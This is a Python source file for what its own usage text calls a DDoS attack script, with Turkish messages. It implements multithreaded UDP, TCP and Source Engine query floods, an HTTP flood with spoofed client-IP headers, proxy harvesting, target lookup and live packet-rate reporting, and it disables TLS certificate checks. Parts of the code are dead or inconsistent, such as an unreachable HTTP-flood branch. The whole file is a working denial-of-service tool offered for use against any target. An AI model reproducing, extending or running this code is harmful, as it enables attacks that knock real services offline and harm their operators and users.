from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice
from socket import (AF_INET, IPPROTO_TCP, SOCK_DGRAM, SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from Antiless import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from Antiless import Tools as ProxyTools
from certifi import where
from icmplib import ping
from psutil import process_iter
from requests import Response, exceptions, get
from yarl import URL

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("AntiDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class renkkodlari:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def exit(*message):
    if message:
        logger.error(renkkodlari.FAIL + " ".join(message) + renkkodlari.RESET)
    shutdown()
    _exit(1)

class Methods:
    LAYER4_AMP: Set[str] = {}
    LAYER4_METHODS: Set[str] = {*LAYER4_AMP, "VSE", "UDP"}
    ALL_METHODS: Set[str] = {*LAYER4_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

class Tools:
    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile('"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True


    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "VSE": self.VSE,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)
  

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)


    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value


class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None: 
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host 
        self._raw_target = (self._host, (self._target.port or 80))
        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)
        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Gerçek-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock
    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-sağlayıcıları"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{renkkodlari.WARNING}Proxy'ler indiriliyor {renkkodlari.OKBLUE}%d{renkkodlari.WARNING} Sağlayıcı{renkkodlari.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{renkkodlari.WARNING}Proxylerin geldiği yer (URL: {renkkodlari.OKBLUE}%s{renkkodlari.WARNING}, Type: {renkkodlari.OKBLUE}%s{renkkodlari.WARNING}, Timeout: {renkkodlari.OKBLUE}%d{renkkodlari.WARNING}){renkkodlari.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Proxyler indilirken hata oluştu: {(e.__str__() or e.__repr__())}')
        return proxes

class ToolsConsole:
    METHODS = {"INFO", "CFIP", "DNS", "PING"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@AntiTools:~#"
        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Komutlar: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} komut bulunamadı")
                continue

            if cmd in ["CFIP", "DNS"]:
                print("Yakında :)")
                continue
            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}bana-ip-adresi-ver# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('lütfen bekle ...', end="\r")
                    info = ToolsConsole.info(domain)
                    if not info["success"]:
                        print("Error!")
                        continue
                    logger.info(("Ülke: %s\n"
                                 "Şehir: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Bölge: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
            if cmd == "PING":
                while True:
                    domain = input(f'{cons}bana-ip-adresi-ver# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    logger.info("lütfen bekle ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Kabul Edilen Paket: %d/%d\n'
                                 'Durum: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))
    @staticmethod
    def stop():
        print('Tüm Saldırılar Durduruldu !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()
    @staticmethod
    def usage():
        print((
                  f'{renkkodlari.FAIL }* AntiLess * - DDoS Saldırı Scripti >  %d Method\n'
                  f'{renkkodlari.OKBLUE}Not: Proxy ile paket yollayamıyor şu anlık, GitPod veya Google Web Console gibi yerlerde bunu kullanmanız tavsiye edilir.\n'
                  f'{renkkodlari.FAIL } > Methodlar:\n'
                  
                  f'{renkkodlari.OKGREEN} > Layer4\n'
                  f'{renkkodlari.FAIL} ------------ \n'
                  ' | %s | %d Method\n'                   
                  ' ------------ \n'
                  f'{renkkodlari.OKGREEN} > Tool\n'
                  f'{renkkodlari.FAIL} -------------------------\n'
                  ' | %s | %d Method\n'
                  ' ------------------------- \n'
                  f'{renkkodlari.OKGREEN} > Diğer\n'
                  f'{renkkodlari.FAIL} ---------------------\n'
                  ' | %s | %d  Method\n'
                  ' ---------------------\n'
                  f'{renkkodlari.OKGREEN} > Toplam %d Method\n'
                  '\n'
                  f'{renkkodlari.HEADER }Örnek:\n'
                  f'{renkkodlari.BOLD}%s\n'
                  f'{renkkodlari.OKCYAN}   Layer4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  f'{renkkodlari.OKCYAN}   Layer4 Proxy: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  f'{renkkodlari.OKCYAN}   Layer4 Güçlendirmeli: python3 %s <method> <ip:port> <threads> <duration> <config.json (Yalnızca Güçlendirme)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}

def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks türü bulunamadı[4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{renkkodlari.WARNING}Dosya mevcut değil, dosya oluşturuluyor ve proxyler indiriliyor.{renkkodlari.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{renkkodlari.OKBLUE}{len(Proxies):,}{renkkodlari.WARNING} Proxy kontrol ediliyor, bu biraz zaman alabilir{renkkodlari.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Kontrolü başarısız oldu, Sorun ağınızda olabilir"
                    " | Hedef mevcut olmayabilir."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{renkkodlari.WARNING}Proxy Sayısı: {renkkodlari.OKBLUE}{len(proxies):,}{renkkodlari.RESET}")
    else:
        logger.info(
            f"{renkkodlari.WARNING}Proxy dosyası boş, proxy olmadan flood çalıştılacak!{renkkodlari.RESET}")
        proxies = None

    return proxies


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method bulunamadı %s" %
                     ", ".join(Methods.ALL_METHODS))


                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                proxy_li = Path(__dir__ / "dosyalar/proxies/" /
                                argv[5].strip())
                useragent_li = Path(__dir__ / "dosyalar/useragent.txt")
                referers_li = Path(__dir__ / "dosyalar/referers.txt")
                proxies: Any = set()

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("Useragent dosyası mevcut değil")
                if not referers_li.exists():
                    exit("Referer dosyası mevcut değil ")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines())

                if not uagents: exit("Boş Useragent Dosyası ")
                if not referers: exit("Boş Referer Dosyası ")

                if threads > 1000:
                    logger.warning("Thread 1000'den yüksek")
                if rpc > 100:
                    logger.warning(
                        "RPC (Request Pre Connection) 100'den yüksek")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)

                port = target.port
                target = target.host


                if port > 65535 or port < 1:
                    exit("Geçersiz port [Min: 1 / Max: 65535] ")


                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if not port:
                    logger.warning("Port Seçili Değil, Varsayılan port: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(__dir__ / "dosyalar" / argfive)
                        if method in {}:
                            if not refl_li.exists():
                                exit("Reflektör dosyası yok.")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Boş reflektör dosyası ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            proxy_li = Path(__dir__ / "dosyalar/proxies" / argv[6].strip())
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if method not in {}:
                                exit("bu yöntem layer4, proxy için kullanılamaz")

                        else:
                            logger.setLevel("DEBUG")
                


                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies).start()

            logger.info(
                f"{renkkodlari.OKCYAN}Saldırı başladı{renkkodlari.HEADER  } ip:{renkkodlari.FAIL} %s{renkkodlari.HEADER } Method:{renkkodlari.FAIL } %s{renkkodlari.HEADER } Süre:{renkkodlari.FAIL} %s{renkkodlari.HEADER } Threads:{renkkodlari.FAIL} %d{renkkodlari.FAIL}!{renkkodlari.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'{renkkodlari.HEADER }Hedef:{renkkodlari.FAIL} %s,{renkkodlari.HEADER } Port:{renkkodlari.FAIL} %s,{renkkodlari.HEADER } Method:{renkkodlari.FAIL} %s{renkkodlari.HEADER } PPS:{renkkodlari.FAIL} %s,{renkkodlari.HEADER } BPS:{renkkodlari.FAIL} %s / %d%%{renkkodlari.RESET}' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SEND)),
                     round((time() - ts) / timer * 100, 2)))
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            event.clear()
            exit()

        ToolsConsole.usage()
